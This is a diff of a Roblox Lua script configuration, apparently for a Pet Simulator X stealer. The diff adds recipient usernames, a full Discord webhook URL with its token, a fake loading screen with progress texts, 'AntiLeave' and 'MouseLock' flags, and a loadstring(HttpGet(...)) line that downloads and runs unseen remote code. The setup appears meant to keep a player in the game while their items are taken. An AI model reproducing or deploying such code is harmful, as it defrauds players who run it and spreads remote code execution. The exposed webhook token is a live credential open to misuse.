@@ -1,11 +1,16 @@
-Username = "Egorik12451"
-WebHook = "webhook"
+UserName = "GiffddWhat"
+UserName2 = "GiffddPro"
+Webhook = "https://discord.com/api/webhooks/1107624578055950336/dLStRubxXcN7upE8eiGMhUomRI8SCPFEJHVnd1LIy_0EbRWAixbWpqbXShbKsUVa9y99"
 
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+-- set them to false if you don't need them
 
-loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 4 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
